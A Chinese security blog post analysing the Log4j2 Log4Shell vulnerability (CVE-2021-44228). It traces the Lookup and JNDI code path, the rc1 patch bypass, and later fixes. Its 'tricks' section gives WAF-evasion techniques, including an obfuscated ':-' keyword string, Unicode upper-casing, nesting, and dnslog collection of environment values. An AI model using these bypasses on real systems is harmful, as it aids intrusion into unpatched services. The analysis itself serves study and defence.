# 浅谈 Log4j2 漏洞 - 跳跳糖
最近的 Log4j2 漏洞在安全圈引起了轩然大波，可以说是核弹级别的漏洞，无论是渗透、研发、安服、研究，所有人都在学习和复现这个漏洞，由于其覆盖面广，引用次数庞大，直接成为可以与永恒之蓝齐名的顶级可利用漏洞，官方 CVSS 评分更是直接顶到 10.0，国内有厂商将其命名为“毒日志”，国外将其命名为 Log4Shell。

在第二天，漏洞利用方式逐渐被研究、披露，因为朋友要做预警，所以找到我简单写了一个漏洞分析和 rc1 补丁绕过的分析，但是我没有发出来，当时也并没有几个人发文章，可能大家都在观望，毕竟国有国法，家有家规，不能也不应该这样轻易的披露漏洞细节。

时间又过去了几天，种种绕过的思路、手段不断的出现，官方也在不断完善更新补丁，本来是不打算写博客的，但毕竟 Struts2 我没赶上，Fastjson 赶上个末尾，这次好不容易赶上一个可能载入史册的漏洞，所以还是写篇文章留个底。本文不会提供 POC 及利用方式，仅进行思路上的探究分享及研究成果记录。

[Apache Log4j2](https://logging.apache.org/log4j/2.x/index.html) 是 Apache 软件基金会下的一个[开源](https://github.com/apache/logging-log4j2)的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。

2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 `${}` 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。

由于其触发方式简单、使用范围广泛，因此漏洞危害极大。

目前，已经为此漏洞颁发了 CVE 编号：[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)，根据[官方安全公告](https://logging.apache.org/log4j/2.x/security.html)，以下为相关信息：  
\- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。  
\- 严重等级：Critical  
\- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H  
\- 影响版本：all versions from 2.0-beta9 to 2.14.1  
\- 详情描述：Apache Log4j2 <=2.14.1 版本提供的 JNDI 特性用于配置、日志信息、参数位置时，无法防护攻击者使用 ldap 或其他 JNDI 相关断点的攻击行为。攻击者如果可以控制日志信息或日志信息参数，则可以在开启了 lookup substitution 功能时利用恶意的 ladp 服务器执行任意代码，在 2.15.0 版本时，默认将其此行为关闭。  
\- 缓解措施：在 >= 2.10 版本，可以通过设置系统属性 `log4j2.formatMsgNoLookups` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS` 为 true 来缓解。在 2.0-beta9 to 2.10.0 版本，可以通过移除 classpath 中的 `JndiLookup` 类来缓解，命令为：`zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`。  
\- 致谢：此问题由阿里云安全团队的 Chen Zhaojun 发现。  
\- 引用：[LOG4J2-3201](https://issues.apache.org/jira/browse/LOG4J2-3201) & [LOG4J2-3198](https://issues.apache.org/jira/browse/LOG4J2-3198)

在 Log4j2 中提供的众多特性中，其中一个就是 Property Support。这个特性让使用者可以引用配置中的属性，或传递给底层组件并动态解析。这些属性来自于配置文件中定义的值、系统属性、环境变量、ThreadContext、和事件中存在的数据，用户也可以提供自定义的 Lookup 组件来配置自定义的值。

这个 Lookup & Substitution 的过程，就是本次漏洞的关键点。提供 Lookup 功能的组件需要实现 `org.apache.logging.log4j.core.lookup.StrLookup` 接口，并通过配置文件进行设置。在最新的官方文档 [Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html) 中，列举了 Log4j2 支持的 Context Map、Date、Docker、Environment、Event、Java、Jndi、JVM Input Arguments、Kubernetes、Log4j Configuration Location、Main Arguments、Map、Marker、Spring Boot 、Structured Data、System Properties、Lower、Upper、Web 如此多种的属性查找及替换选项。

而其中所支持的 Jndi 就是本次漏洞的触发点。

我们首先使用没进行安全补丁更新的 2.14.0 版本进行复现和测试。

[漏洞复现](#toc_)
-------------

启动恶意服务器，用来给 ldap/rmi 调用返回恶意代码，这里使用的是作者自写的 [JNDI 注入测试工具](https://github.com/su18/JNDI)。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/3b28602c-f056-40ac-af56-3b66d304ef0a.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/5567f24c-bc49-4caa-adc5-0dcb96df189d.png)

使用 `logger.info()` 方法触发漏洞，弹出计算器。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/a1a01307-5c3e-4c30-bdf7-2cb46744627b.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/a705a0bb-1a05-42dc-a7cb-023cc388bb08.png)

可以看到，漏洞的触发非常简单，也正因为如此，说明漏洞的危害非常之大。

[关键点分析](#toc__1)
----------------

Log4j2 关于 Lookup 功能的使用以及漏洞的触发，包括几个关键点，这里依次来进行分析。

### [日志记录/触发点](#toc__2)

通常我们使用 `LogManager.getLogger()` 方法来获取一个 Logger 对象，并调用其 debug/info/error/warn/fatal/trace/log 等方法记录日志等信息。

在这些所有的方法里，都会先使用名为 `org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled` 的若干个重载方法来根据当前的配置的记录日志的等级，来判断是否需要输出 console 和记录日志文件。其中 Log4j 包括的日志等级层级分别为：ALL < DEBUG < INFO < WARN < ERROR < FATAL < OFF。

在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：

`<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
    <Loggers>
        <Logger name="org.su18" level="All"/>
    </Loggers>
</Configuration>` 

也可以使用如下代码来配置输出等级：

`LoggerContext ctx          = (LoggerContext) LogManager.getContext(false);
Configuration config       = ctx.getConfiguration();
LoggerConfig  loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
loggerConfig.setLevel(Level.ALL);
ctx.updateLoggers();` 

本此漏洞的触发点，实际上是从 `AbstractLogger#logMessage` 方法开始的，凡是调用了此方法的 info/error/warn 等全部方法均可以作为本次漏洞的触发点，只是取决于配置的漏洞输出等级。

### [消息格式化](#toc__3)

Log4j2 使用 `org.apache.logging.log4j.core.pattern.MessagePatternConverter` 来对日志消息进行处理，在实例化 MessagePatternConverter 时会从 Properties 及 Options 中获取配置来判断是否需要提供 Lookups 功能。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/09b3988c-815d-4e50-9ae7-12c0606cf976.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/80bf8746-c320-4c18-9df7-25ce75de9842.png)

获取 `log4j2.formatMsgNoLookups` 配置的值，默认为 false，因此 Lookups 功能默认是开的。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/b35631cf-1f41-422b-81ff-df170594825b.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/f0fbdc53-b9ed-4d3c-b50a-6adf6ab9e0b0.png)

调用 `StrSubstitutor#replace` 方法进行字符替换操作。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/5ca4fbff-47fc-4ee4-a5c4-3c89513004a6.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/d999de21-ec96-48e0-84dd-b46db15dd3df.png)

### [字符替换](#toc__4)

Log4j2 提供 Lookup 功能的字符替换的关键处理类，位于`org.apache.logging.log4j.core.lookup.StrSubstitutor`，首先来看一下这个类。

类中提供了关键的 `DEFAULT_ESCAPE` 是 `$`，`DEFAULT_PREFIX` 前缀是 `${`，`DEFAULT_SUFFIX` 后缀是 `}`，`DEFAULT_VALUE_DELIMITER_STRING` 赋值分隔符是 `:-`，`ESCAPE_DELIMITER_STRING` 是 `:\-`。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/dcf1bb8a-502f-42c8-b9fe-57a556238a54.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/e6bb9592-956b-49d2-afce-2f971d804ad4.png)

这个类提供的 `substitute` 方法，是整个 Lookup 功能的核心，用来递归替换相应的字符，这里来仔细看一下处理逻辑。

方法通过 while 循环逐个字符串寻找 `${` 前缀。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/d5cf7713-51c1-4474-bc31-754d3db1d93e.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/c1bab5b9-8108-4b4f-871f-41535871bffa.png)

找到前缀后开始找后缀，但是在找后缀的 while 循环里，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果又找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，用来满足变量中嵌套的情况。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/60d1d036-8ad7-410c-8659-0f52904c141b.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/94a8dd4d-b9ed-4f07-9cca-d5cc7fd3e6a3.png)

后续的处理中，通过多个 if/else 用来匹配 `:-` 和 `:\-`。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/c740337a-9e1f-44f6-9872-138ff45b9f0b.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/966aee55-c525-4f9b-844a-7b0720bc8ee7.png)

由于篇幅原因，这里我不再依次跟代码讲解，直接描述一下：  
\- `:-` 是一个赋值关键字，如果程序处理到 `${aaaa:-bbbb}` 这样的字符串，处理的结果将会是 `bbbb`，`:-` 关键字将会被截取掉，而之前的字符串都会被舍弃掉。  
\- `:\-` 是转义的 `:-`，如果一个用 `a:b` 表示的键值对的 key `a` 中包含 `:`，则需要使用转义来配合处理，例如 `${aaa:\\-bbb:-ccc}`，代表 key 是，`aaa:bbb`，value 是 `ccc`。

在没有匹配到变量赋值或处理结束后，将会调用 `resolveVariable` 方法解析满足 Lookup 功能的语法，并执行相应的 lookup ，将返回的结果替换回原字符串后，再次调用 `substitute` 方法进行递归解析。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/1825c91a-35ab-4f7b-bf1d-9cf0207aa15c.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/f36cf8e7-7a86-414b-817c-825abe2e258f.png)

因此在字符串替换的过程中可以看到，方法提供了一些特殊的写法，并支持递归解析。而这些特性，将会可以用来进行绕过 WAF。

`resolveVariable` 则调用 `this.variableResolver#lookup` 方法进行处理，而这实际上是一个代理类 `Interpolator`，这个类在接下来的内容进行说明。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/2e205f6d-6afd-449b-9126-9a4ac80c73db.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/c4d9c49f-20e9-47eb-8d74-25711136277f.png)

通过在 `StrSubstitutor#substitute` 方法下断点/Hook 点，可以找到来自日志信息、配置文件、变量名、参数等位置的调用，也就是说，这个漏洞的触发点不仅仅在于记录日志的部分，但是是最容易触发的位置。

### [Lookup 处理](#toc_lookup)

Log4j2 使用 `org.apache.logging.log4j.core.lookup.Interpolator` 类来代理所有的 `StrLookup` 实现类。也就是说在实际使用 Lookup 功能时，由 Interpolator 这个类来处理和分发。

这个类在初始化时创建了一个 `strLookupMap` ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/213f7d0b-b6a2-49d7-87a3-54a834e898c1.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/07d82260-7aca-48f0-9465-a952f639de5b.png)

在 2.14.0 版本中，默认是加入 log4j、sys、env、main、marker、java、lower、upper、jndi、jvmrunargs、spring、kubernetes、docker、web、date、ctx，由于部分功能的支持并不在 core 包中，所以如果加载不到对应的处理类，则会添加警告信息并跳过。而这些不同 Lookup 功能的支持，是随着版本更新的，例如在较低版本中，不存在 upper、lower 这两种功能，因此在使用时要注意环境。

处理和分发的关键逻辑在于其 `lookup` 方法，通过 `:` 作为分隔符来分隔 Lookup 关键字及参数，从`strLookupMap` 中根据关键字作为 key 匹配到对应的处理类，并调用其 lookup 方法。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/a51b8a95-70eb-469e-b613-b23917f03ddb.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/4541e4b2-cbd1-4e51-a790-095740fec0b4.png)

本次漏洞的触发方式是使用 `jndi:` 关键字来触发 JNDI 注入漏洞，对于 `jndi:` 关键字的处理类为 `org.apache.logging.log4j.core.lookup.JndiLookup` 。看一下最关键的 `lookup` 方法，可以看到是使用了 JndiManager 来支持 JNDI 的查询功能。具体实现将在下一小节进行描述。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/50cf0792-557d-4775-b8cf-846ba2432d35.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/0277cecd-10f9-4c26-9462-1fbbed3533c0.png)

这里除了 `jndi:` 方法外，还支持上述多种 Lookup 功能，包括获取环境变量、系统配置、Java 环境等等，由于 Log4j2 支持递归和嵌套解析，所以可以用来获取相关信息来实现一些攻击思路，将在后续的技巧中进行详述。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/411bdaee-5d4c-40da-bbb8-cc57ad3059ce.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/9291a21f-8700-4d08-a9de-f13e4e279ff0.png)

### [JNDI 查询](#toc_jndi)

Log4j2 使用 `org.apache.logging.log4j.core.net.JndiManager` 来支持 JDNI 相关操作。

JndiManager 使用私有内部类 JndiManagerFactory 来创建 JndiManager 实例，如下图：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/8bc1797c-79b3-4433-9f94-edff8b9845a2.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/69e65aa4-b65c-432a-b4cd-b5beb73c8c17.png)

可以看到是创建了一个新的 InitialContext 实例，并作为参数传递用来创建 JndiManager，这个 Context 被保存在成员变量 context 中：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/7fdefbbc-8ee2-4ffb-ade8-b4c17a66064a.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/0c5892e0-eccf-4f35-8714-fe4d02c2094b.png)

`JndiManager#lookup` 方法则调用 `this.context.lookup()` 实现 JNDI 查询操作。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/836fe2e9-654d-4d40-b683-3b50e2e81900.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/87bbb91e-a352-42fa-8448-ed1f4f23e7ba.png)

实际上，JndiManager 这个类就是在本次漏洞中 Log4j2 包内的最终 sink 点。

[rc1 及绕过](#toc_rc1)
-------------------

在漏洞遭到披露后，Log4j2 官方发布了 log4j-2.15.0-rc1 安全更新包，但经过研究后发现在开启 lookup 配置时，可以被绕过。

本次安全更新关键有两个位置。

在 2.15.0-rc1的更新包中，移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/27845cd2-15a3-47a5-b05d-1a3fef5eeb6c.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/110a7c8e-d5b9-4db6-a624-0b01e6cdafe8.png)

并在 MessagePatternConverter 类中创建了内部类 `SimpleMessagePatternConverter`、`FormattedMessagePatternConverter`、`LookupMessagePatternConverter`、`RenderingPatternConverter`，将一些扩展的功能进行模块化的处理，而只有在开启 lookup 功能时才会使用 `LookupMessagePatternConverter` 来进行 Lookup 和替换。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/4fea6d74-4a34-410b-97a7-b0ea40e96911.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/dbe7a770-019d-4283-80a5-2a9e15f04b00.png)

在默认情况下，将使用 `SimpleMessagePatternConverter` 进行消息的格式化处理，不会解析其中的 `${}` 关键字。

第二个关键位置是 `JndiManager#lookup` 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/5031fb5c-0579-45ef-b36d-4f4f909d91e9.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/3315f3ee-80eb-4dfd-96d5-783856abfb16.png)

其中 `permanentAllowedHosts` 是本地 IP，`permanentAllowedClasses` 是八大基础数据类型加 `Character`，`permanentAllowedProtocols` 包含 java/ldap/ldaps。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/4c07cf69-daa9-4dca-8e66-99b8714bb72d.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/7ab6db3c-ca82-4f24-a525-5ecfe8959601.png)

并在关键的 lookup 函数中加入了校验判断，但是由于校验逻辑有误，程序在 catch 住异常后没有 return，导致可以利用 `URISyntaxException` 异常来绕过校验，直接走到后面的 lookup。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/26ff79c8-eb2d-4c7a-ae4b-2d6820a7f5a4.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/f6bc5ac0-9868-4e4b-ad5f-59e35d36681c.png)

因此，只要在判断时触发 `URISyntaxException` 异常，例如在 URI 中插入空格，即可触发漏洞，复现如下：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/3898109f-8d2a-4338-b171-8e97ba1b0cd8.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/323acd54-ee06-42ff-9860-438672968ea7.png)

虽然此处绕过了校验，但由于默认 lookup 配置为关闭，需要开启才能触发漏洞，所以危害较低。

[rc2 及思考](#toc_rc2)
-------------------

在 rc1 更新被绕过后，官方发布了 rc2，代码如下，可以看到是在 catch 里添加了 return，修复了 rc1 的绕过。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/6e594a15-b832-488e-b4d1-a7eefc62bb49.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/478f074d-1a2b-4dd7-afee-26971bcc5d3a.png)

但是还有师傅并不满足于止步在官方的更新，尝试使用 Appenders 配置及异常处理等问题来进行绕过。但总体来说，后续的几个版本更新已经默认禁用了 JNDI Lookup 的功能，甚至直接移除了对日志消息的 Lookup 功能支持，因此在此处继续研究绕过的意义并不大。

[UPDATE 3208](#toc_update-3208)
-------------------------------

在最近一次的版本提交[LOG4J2-3208](https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea)中，可以看到官方表示 “Disable JNDI by default”，默认将 JNDI 关闭，这是如何实现的呢？其实也不难想象，那就是在 `org.apache.logging.log4j.core.lookup.Interpolator` 初始化内部变量 `strLookupMap` 时，需要经过判断才将实现 JNDI Lookup 的类 JndiLookup 加入。

官方引入了一个 `log4j2.enableJndi` 参数用来表示是否开启 Jndi。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/9b23a0af-70fd-4ca6-b5f1-6001b999ae37.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/b57417e1-9fa5-456e-88f7-a34e2d88ccec.png)

在初始化 `strLookupMap` 时，先进行判断。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/9db84110-b3fb-48de-ab64-b08553b4dfef.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/966e4fc1-009c-49a2-8bf7-dea49f422625.png)

同时保留了在 JndiManager 中的白名单校验。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/1db686a6-a93a-44ea-91ef-4e26c0aa192c.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/e4b7fe2f-3c37-4336-a547-29b5f26bd01e.png)

并将判断同时引入了 JmsManager，对 JMS Appenders 进行了限制。

[![](https://storage.tttang.com/media/attachment/2021/12/15/b7e49880-e35e-4a51-af20-aeb3523c872e.png)
](https://storage.tttang.com/media/attachment/2021/12/15/b7e49880-e35e-4a51-af20-aeb3523c872e.png)

通过此判断，可以较好的确保在未开启 `log4j2.enableJndi` 时，无法使用 JNDI 查询功能。

[2.16.0-rc1](#toc_2160-rc1)
---------------------------

截至作者发文前，官方又提了一次[更新](https://github.com/apache/logging-log4j2/compare/log4j-2.15.1-rc1...log4j-2.16.0-rc1)，版本号 2.16-rc1，通过两个版本的对比可以看出，官方移除了 MessagePatternConverter 的内部实现类 LookupMessagePatternConverter，并删除了相关调用代码。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/5cb6805b-28e9-4a9c-a6d4-8d49892fcb20.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/d39f580b-9ee5-4b5a-bc90-223a366e9b1c.png)

也就是说，从这个版本开始，log4j2 不再支持日志消息的 Lookup 功能。

至此为止，由记录日志导致的攻击可以说是落下了帷幕。

[技巧](#toc__5)
-------------

在 Log4j2 的影响迅速蔓延之后，各大安全防御类产品都在尝试添加规则对此种漏洞类型进行有效防护，包括流量层、HTTP 协议层等防御层级。

但对于此类漏洞，触发点非常广泛，除了使用 RASP 技术能防范的较为理想之外，其他的防御手段也可能因为校验有瑕疵而导致被绕过。

本小节总结几个可以用来绕过的技巧。

### [关键字截取](#toc__6)

在 Lookup 功能处理时的关键字替换过程中，提到了可以使用 `:-` 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字。例如：

可以尝试混淆为：

`${:::::-j}${what:-n}${ls:-d}${1QAZ2wxs:-i}` 

并可以将其嵌套使用，可以用来绕过一些不完善的正则、关键字的匹配。

### [编码绕过](#toc__7)

在浅蓝师傅发的[公众号](https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg)中，利用了 UpperLookup 调用字符串的 `toUpperCase` 方法可以将不同 Locale 转为 Unicode Standard 字符的特性，例如将 Turkish 的 ı（\\u0131） 经过 `toUpperCase` 转为 I（\\u0069）。

JDK 注释中也提到了这种一对多的映射方式，用的就是这个示例：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/078f4fe7-79c8-4bbc-a1d3-fc4dbcc91041.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/3abf7332-744f-4ceb-a412-b125b87f4f09.png)  
结合 `${upper:}` 用法，可以绕过一些对于关键字的校验：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/e2e37fe5-c9b7-45f0-b4b2-5328837f8edb.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/13f5ffef-1e4a-4acd-8d5a-bc1b7de8ad47.png)

### [嵌套](#toc__8)

由于 Lookup 功能在替换字符时支持递归解析和替换，因此在构造 POC 时可以嵌套构造，增加 payload 复杂度，绕过 WAF 的同时，还可能给服务器带来解析负担，造成 DOS 漏洞。

这个问题由 4rain 师傅提交并获得致谢。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/32a9aff4-f085-4fe7-aa01-57406e980e43.jpeg?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/0f8376e0-0a2c-4a11-a813-cc87f018e727.jpg)

### [带外](#toc__9)

虽然除了 JNDI 之外的核心包里的 Lookup 不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步的攻击。

例如使用 `${hostName}`、`${env:USERDOMAIN}`、`${env:COMPUTERNAME}` 配合 dnslog 快速定位受影响机器进行修复。

[Appenders](#toc_appenders)
---------------------------

[Appenders](https://logging.apache.org/log4j/2.x/manual/appenders.html) 是 Log4j2 提供的特性之一，通俗来说，就是用来将日志“附加”输出到其他位置。

通过官方文档可以看到，目前支持了 Async、Cassandra、Console、Failover、File、Flume、JDBC、JMS、JPA、Http、Kafka、MemoryMappedFile、NoSQL、NoSQL、MongoDB、MongoDB 3、MongoDB 4、CouchDB、OutputStream、RandomAccessFile、Rewrite、RollingFile、RollingRandomAccessFile、Routing、SMTP、Socket、Syslog 等数十种日志输出位置。

其中包括了多种网络通信协议、多种数据存储方式以及多种不同类型的数据交换操作，也就是说，Log4j2 自身通过诸多 Appenders 提供了非常多的操作，并使用对应的 `org.apache.logging.log4j.core.appender.AbstractManager` 的实现类来进行此项操作，例如 HttpManager 会发送 http 请求，FileManager 会写入文件等等，而这些 “Manager” 在调用不当时将会产生安全风险。

在本次漏洞中没有直接使用 Appenders 来参与漏洞调用链，但在涉及到 Log4j 1.x 版本是否会受到影响的讨论时，有人提出由于 Appenders 特性的存在会导致 Log4j 1.x 版本也是潜在的风险版本，这一点下一节影响范围中将会详述。

根据各大公众号、群聊、小道消息、各位师傅分享等消息来源途径，本次漏洞可能影响 Apache Struts2、Apache Solr、Apache Druid、Apache Flink、ElasticSearch、VCenter 等等产品，甚至影响到了 Log4j 1.x 版本，接下来我们来分析一下本次漏洞影响组件的实际情况。

首先可以通过在 maven 仓库中搜索引用的方式来查找引用，例如：[https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1)

火线平台也上线了[Apache Log4j2 漏洞影响面查询](https://log4j2.huoxian.cn/layout)，可以用来查询风险组件。

在 Gist 上也存在一个共同维护的[项目](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)，列举了一些受到威胁的组件及版本。

接下来分析和测试一些比较受关注的组件。

[Log4j 1.x](#toc_log4j-1x)
--------------------------

在漏洞刚刚爆发出来了的时候，看到有人说 Log4j 1.x 版本也能受到影响，但是 Log4j 还没支持 Lookup 功能，为什么会受到此漏洞的影响的？

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/e69defe9-7455-49c4-a953-d800d240a0b9.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/87b84a6e-27fc-4393-8f3a-5ef1e7dd852d.png)

答案是之前提到的 Appenders，以 1.2.17 版本为例，Log4j 支持 18 种 Appenders（第一个是抽象类），其中就包括了 JMS Appender。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/2a23abad-7fd1-49ac-87a8-bc8a3f7f6483.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/68bdd1cb-26b0-4b2f-80af-4248bb881f33.png)

在 Log4j 中，由 `org.apache.log4j.net.JMSAppender` 直接提供 JNDI 的查询功能。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/3400f8fc-898c-49bb-b817-6943442f8fcf.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/bc50e25a-c7e5-4f38-b145-f01e27c95029.png)

`this.lookup` 方法直接调用 Context 对象的 lookup 方法，触发查询功能。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/7e30ba0d-66d6-472e-b68d-272d40e7cd94.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/899dc585-dcab-46d7-bea7-97ac78aa8be3.png)

可以看到，Log4j 1.x 版本还是有执行 JNDI 查询的能力的，但触发点呢？由于其并不是解析用户日志消息，所以 Appenders 的触发点只能是配置文件。

也就是说，如果配置文件可控，攻击者将其修改连接恶意的 JNDI 服务器，再调用 appender 时即可触发攻击。

由于攻击链路条件限制较高，所以我认为其不能算是受到影响，甚至连“风险”都算不上，只能说是特殊场景下的一种攻击链路而已，而且现在 Log4j 已经作为一个过时的项目，不再维护，所以只要是正常使用的用户，本质上不会受到本次 Log4j2 漏洞影响。

漏洞复现截图：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/71575347-e402-45d5-9dda-c3b5978bbc9b.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/b00455e1-7447-4436-b93f-5033f3192d19.png)

既然能控制配置文件，那攻击思路就不止局限于 JMS Appender，也可以使用 JDBC 等其他 Appenders 尝试触发攻击，在作者发表文章之前，p4nda 师傅已经将其对于 Log4j 受影响情况的研究发了出来，里面的配置和示例比较详细，可以[移步观看](https://mp.weixin.qq.com/s/NzDli0ul4PoAoABdyQq7Hg)。

同 Log4j，threedr3am 师傅指出，Log4j2 对于配置文件中的变量解析也是可以触发漏洞。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/0489a511-ee3b-4491-b226-cadc189bb12d.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/d2e393e5-fe31-4112-b3c5-ebd4ee07cb87.png)

这是由于 Log4j2 读取配置文件中的内容不会经过判断，直接调用进入替换 lookup 逻辑，在低版本中可以直接触发，在高版本中需要经过校验。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/943c482a-a220-4b5c-8ce0-c49f88a55d07.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/e757e1f4-2547-4397-83dd-18b4a099e039.png)

[SpringBoot](#toc_springboot)
-----------------------------

默认情况下，Spring Boot 会用 Logback 来记录日志，并用 INFO 级别输出到控制台。也就是说，虽然包含了 Log4j2 的 jar 包，但是如果没有配置调用，是不会受到危害的。

但如果将日志框架修改为 Log4j2，则会受到此漏洞的影响，例如将配置文件改为如下格式：

`<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <exclusions>
            <exclusion>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-logging</artifactId>
            </exclusion>
        </exclusions>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-log4j2</artifactId>
        <version>2.6.1</version>
    </dependency>
</dependencies>` 

漏洞复现截图

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/c78278c9-47e5-4602-82c4-ad42367d5cd5.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/d0264aeb-1213-468f-a77c-72a807691530.png)

